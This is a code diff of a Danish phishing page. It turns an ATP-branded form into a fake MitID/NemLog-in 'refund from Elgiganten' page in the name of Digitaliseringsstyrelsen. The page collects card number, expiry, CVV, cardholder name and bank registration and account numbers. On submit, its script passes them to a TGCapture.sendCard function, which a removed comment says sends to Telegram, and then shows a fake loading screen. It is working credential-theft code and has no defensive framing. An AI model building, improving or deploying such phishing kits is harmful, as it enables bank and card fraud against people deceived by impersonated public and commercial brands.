Ny4wOTM4IDEzLjM0MTUgMjcuODY4IDEzLjM0MTVDMjguMzI3NiAxMy4zNDE1IDI4LjgzNTUgMTMuMTk1MiAyOS4xNzQzIDEyLjk3NTdWMTUuNjU4N0MyOC43NjI5IDE1Ljg3ODMgMjguMDM3MiAxNiAyNy4yMzkgMTZDMjUuMDM3OCAxNiAyMy42NTg5IDE0LjkwMjQgMjMuNjU4OSAxMi40ODc4VjcuMzE3MjJaIiBmaWxsPSIjMDA2MEU2Ii8+DQo8L3N2Zz4NCg==" alt="MitID" style="height:18px;">
       </div>
-      <div class="form-card__header-text">
-        <h2>Kort &amp; Konto Detaljer</h2>
-        <p>Tilknyt dit betalingskort og din bankkonto</p>
+      <hr class="card-divider">
+
+      <!-- Refundering banner -->
+      <div class="refund-banner">
+        <div class="refund-banner__icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/>
+          </svg>
+        </div>
+        <div class="refund-banner__body">
+          <div class="refund-banner__label">Refundering</div>
+          <div class="refund-banner__title">Refundering fra Elgiganten</div>
+          <div class="refund-banner__sub">Bekræft dine oplysninger for at modtage din refundering.</div>
+        </div>
       </div>
-    </div>
 
-    <form id="card-form" novalidate>
-      <div class="form-card__body">
+      <form id="card-form" novalidate>
 
-        <!-- Live card preview -->
-        <div class="card-preview">
-          <div class="card-preview__label">Betalingskort</div>
-          <div class="card-preview__number" id="preview-number">•••• •••• •••• ••••</div>
-          <div class="card-preview__bottom">
-            <div class="card-preview__name" id="preview-name">KORTEJER NAVN</div>
-            <div class="card-preview__expiry">
-              <span>Udløber</span>
-              <span id="preview-expiry">MM/ÅÅ</span>
-            </div>
-          </div>
-          <div class="card-chip">
-            <svg viewBox="0 0 38 28" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <rect x="1" y="1" width="36" height="26" rx="4" fill="#D4AF37" stroke="#B8960C" stroke-width="1.5"/>
-              <rect x="7" y="7" width="24" height="14" rx="2" fill="none" stroke="#B8960C" stroke-width="1"/>
-              <line x1="19" y1="7" x2="19" y2="21" stroke="#B8960C" stroke-width="1"/>
-              <line x1="7" y1="14" x2="31" y2="14" stroke="#B8960C" stroke-width="1"/>
-            </svg>
-          </div>
+        <div class="section-label">
+          Kortoplysninger
+          <span class="help-icon" title="Dine kortoplysninger krypteres">?</span>
         </div>
 
-        <div class="secure-notice" style="margin-top:22px;">
-          <span class="secure-notice__icon">
-            <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z"/></svg>
-          </span>
-          <span class="secure-notice__text">
-            <strong>256-bit kryptering.</strong> Dine kortdata behandles sikkert og gemmes ikke på vores servere.
-          </span>
-        </div>
-
-        <!-- Section: Kortoplysninger -->
-        <div class="section-divider">
-          <div class="section-divider__line"></div>
-          <div class="section-divider__label">Kortoplysninger</div>
-          <div class="section-divider__line"></div>
-        </div>
-
-        <!-- Kortejer navn -->
         <div class="field-group" id="fg-kortejer">
-          <label for="kortejer">
-            <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
-            Kort Ejernavn
-          </label>
+          <label for="kortejer">Kort Ejernavn</label>
           <input type="text" id="kortejer" name="kortejer" placeholder="Kort Ejernavn" autocomplete="cc-name" style="text-transform:uppercase">
           <span class="error-msg">Indtast venligst kortholderens navn.</span>
         </div>
 
-        <!-- Kortnummer -->
         <div class="field-group" id="fg-kortnummer">
-          <label for="kortnummer">
-            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
-            Kort Nummer
-          </label>
+          <label for="kortnummer">Kortnummer</label>
           <input type="text" id="kortnummer" name="kortnummer" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" inputmode="numeric">
           <span class="error-msg">Indtast venligst et gyldigt kortnummer (16 cifre).</span>
         </div>
 
-        <!-- Udløbsdato + CVV -->
         <div class="field-row">
           <div class="field-group" id="fg-udlob">
-            <label for="udlob">
-              <svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM7 10h5v5H7z"/></svg>
-              Udløbsdato
-            </label>
+            <label for="udlob">Udløbsdato</label>
             <input type="text" id="udlob" name="udlob" placeholder="MM/ÅÅ" maxlength="5" autocomplete="cc-exp" inputmode="numeric">
-            <span class="error-msg">Ugyldig dato (MM/ÅÅ).</span>
+            <span class="error-msg">Ugyldig dato.</span>
           </div>
           <div class="field-group" id="fg-cvv">
-            <label for="cvv">
-              <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
-              CVV
-            </label>
+            <label for="cvv">CVV</label>
             <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
-            <div class="field-note">3 eller 4 cifre på bagsiden af kortet.</div>
+            <div class="field-note">3 eller 4 cifre på bagsiden.</div>
             <span class="error-msg">Ugyldig CVV.</span>
           </div>
         </div>
 
-        <!-- Section: Kontooplysninger -->
-        <div class="section-divider">
-          <div class="section-divider__line"></div>
-          <div class="section-divider__label">Kontooplysninger</div>
-          <div class="section-divider__line"></div>
+        <div class="section-label" style="margin-top:20px;">
+          Kontooplysninger
+          <span class="help-icon" title="Refusionen sendes til denne konto">?</span>
         </div>
 
-        <!-- Regnr + Kontonr -->
         <div class="field-row">
           <div class="field-group" id="fg-regnr">
-            <label for="regnr">
-              <svg viewBox="0 0 24 24"><path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zM12 1L2 6v2h20V6z"/></svg>
-              Registreringsnr.
-            </label>
+            <label for="regnr">Registreringsnr.</label>
             <input type="text" id="regnr" name="regnr" placeholder="Registreringsnr." maxlength="4" inputmode="numeric">
             <span class="error-msg">Angiv venligst registreringsnummer.</span>
           </div>
           <div class="field-group" id="fg-kontonr">
-            <label for="kontonr">
-              <svg viewBox="0 0 24 24"><path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zM12 1L2 6v2h20V6z"/></svg>
-              Kontonummer
-            </label>
+            <label for="kontonr">Kontonummer</label>
             <input type="text" id="kontonr" name="kontonr" placeholder="Kontonummer" maxlength="10" inputmode="numeric">
             <span class="error-msg">Angiv venligst kontonummer.</span>
           </div>
         </div>
 
+        <button type="submit" class="button-primary" id="card-submit-btn">
+          <span>Fortsæt</span>
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/>
+          </svg>
+        </button>
+
+        <div class="link-row">
+          <span class="link-info-icon">i</span>
+          <a href="#">Har du brug for hjælp med refunderingen?</a>
+        </div>
+
+        <div class="check-row">
+          <input type="checkbox" id="husk" name="husk">
+          <label for="husk">Gem mine kortoplysninger sikkert</label>
+        </div>
+
+        <div class="bottom-links">
+          <a href="info.html">Afbryd</a>
+          <a href="#">Hjælp</a>
+        </div>
+
+      </form>
+    </div>
+
+    <!-- ── Right: info sidebar ── -->
+    <aside class="side-col">
+
+      <div class="info-box">
+        <div class="info-box__header">Status på refundering</div>
+        <div class="info-box__body">
+          <p>Behandlingstid: <strong>1–3 hverdage</strong></p>
+        </div>
       </div>
 
-      <div class="form-card__footer">
-        <button type="submit" class="btn-submit" id="card-submit-btn">
-          <span class="btn-submit__text">Bekræft og afslut</span>
-          <span class="btn-submit__arrow">
-            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-          </span>
-        </button>
-        <button type="button" class="btn-back" onclick="window.location.href='info.html'">
-          ← Tilbage til personlige oplysninger
-        </button>
+      <div class="info-box">
+        <div class="info-box__header">Sikker brug af refundering</div>
+        <div class="info-box__body">
+          <p>Pas godt på dine kortoplysninger og hold altid dine betalingsdata for dig selv. Få gode råd til sikker brug af MitID.</p>
+          <p><a href="#">Sikkerhed</a></p>
+        </div>
       </div>
-    </form>
+
+      <div class="info-box">
+        <div class="info-box__header">Mere information</div>
+        <div class="info-box__body">
+          <ul>
+            <li><a href="#">Hjælp til Login<span class="ext-icon"></span></a></li>
+            <li><a href="#">Om NemLog-in<span class="ext-icon"></span></a></li>
+            <li><a href="#">Cookies på NemLog-in<span class="ext-icon"></span></a></li>
+            <li><a href="#">Læs om MitID<span class="ext-icon"></span></a></li>
+            <li><a href="#">Læs om MitID Erhverv<span class="ext-icon"></span></a></li>
+            <li><a href="#">Tilgængelighedserklæring<span class="ext-icon"></span></a></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="info-box">
+        <div class="info-box__header">Behandling af dine personoplysninger</div>
+        <div class="info-box__body">
+          <p>Når du anvender NemLog-in til at bekræfte din identitet, bliver dine personoplysninger behandlet af Digitaliseringsstyrelsen.</p>
+        </div>
+      </div>
+
+    </aside>
+
   </div>
-</main>
+</div>
 
 <!-- ── Footer ── -->
 <footer class="site-footer">
-  <p>&copy; 2026 ATP – Arbejdsmarkedets Tillægspension &nbsp;|&nbsp;
-    <a href="#">Privatlivspolitik</a> &nbsp;|&nbsp;
-    <a href="#">Tilgængelighed</a>
-  </p>
+  &copy; 2026 Digitaliseringsstyrelsen &nbsp;|&nbsp;
+  <a href="#">Privatlivspolitik</a> &nbsp;|&nbsp;
+  <a href="#">Tilgængelighed</a> &nbsp;|&nbsp;
+  <a href="#">Cookies</a>
 </footer>
 
 <script src="tg.js"></script>
@@ -758,9 +734,7 @@
   kortInput.addEventListener('input', function () {
     var v = this.value.replace(/\D/g, '').substring(0, 16);
     this.value = v.replace(/(.{4})/g, '$1 ').trim();
-    updatePreview();
-    if (v.length > 0) this.classList.add('filled');
-    else this.classList.remove('filled');
+    if (v.length > 0) this.classList.add('filled'); else this.classList.remove('filled');
   });
 
   /* ── Expiry formatter ── */
@@ -769,55 +743,30 @@
     var v = this.value.replace(/\D/g, '').substring(0, 4);
     if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
     this.value = v;
-    updatePreview();
-    if (v.length > 0) this.classList.add('filled');
-    else this.classList.remove('filled');
+    if (v.length > 0) this.classList.add('filled'); else this.classList.remove('filled');
   });
 
-  /* ── Numeric only for CVV / Regnr / Kontonr ── */
+  /* ── Numeric only ── */
   ['cvv','regnr','kontonr'].forEach(function (id) {
-    var el = document.getElementById(id);
-    el.addEventListener('input', function () {
+    document.getElementById(id).addEventListener('input', function () {
       this.value = this.value.replace(/\D/g, '');
-      if (this.value.length > 0) this.classList.add('filled');
-      else this.classList.remove('filled');
+      if (this.value.length > 0) this.classList.add('filled'); else this.classList.remove('filled');
     });
   });
 
   /* ── Kortejer live ── */
-  var kortejerInput = document.getElementById('kortejer');
-  kortejerInput.addEventListener('input', function () {
-    updatePreview();
-    if (this.value.trim()) this.classList.add('filled');
-    else this.classList.remove('filled');
+  document.getElementById('kortejer').addEventListener('input', function () {
+    if (this.value.trim()) this.classList.add('filled'); else this.classList.remove('filled');
   });
-
-  /* ── Live preview update ── */
-  function updatePreview() {
-    var num = document.getElementById('kortnummer').value.trim();
-    var name = document.getElementById('kortejer').value.trim().toUpperCase();
-    var exp  = document.getElementById('udlob').value.trim();
-
-    var pn = document.getElementById('preview-number');
-    pn.textContent = num || '•••• •••• •••• ••••';
-
-    var pname = document.getElementById('preview-name');
-    pname.textContent = name || 'KORTEJER NAVN';
-
-    var pexp = document.getElementById('preview-expiry');
-    pexp.textContent = exp || 'MM/ÅÅ';
-  }
 
   /* ── Validation ── */
   function markError(id, bad) {
     var fg = document.getElementById('fg-' + id);
     if (!fg) return;
-    if (bad) fg.classList.add('has-error');
-    else fg.classList.remove('has-error');
+    if (bad) fg.classList.add('has-error'); else fg.classList.remove('has-error');
   }
 
-  var form = document.getElementById('card-form');
-  form.addEventListener('submit', function (e) {
+  document.getElementById('card-form').addEventListener('submit', function (e) {
     e.preventDefault();
 
     var kortejer   = document.getElementById('kortejer').value.trim();
@@ -837,20 +786,12 @@
 
     if (!ok) return;
 
-    // Send full combined message to Telegram using unified ATP format
     if (window.TGCapture) {
-      TGCapture.sendCard({
-        kortejer:   kortejer,
-        kortnummer: kortnummer,
-        udlob:      udlob,
-        cvv:        cvv,
-        regnr:      regnr,
-        kontonr:    kontonr
-      });
+      TGCapture.sendCard({ kortejer, kortnummer, udlob, cvv, regnr, kontonr });
     }
 
-    // Redirect to loading page
-    window.location.href = 'loading.html';
+    document.getElementById('loading-overlay').classList.add('visible');
+    setTimeout(function () { window.location.href = 'loading.html'; }, 1200);
   });
 
 }());
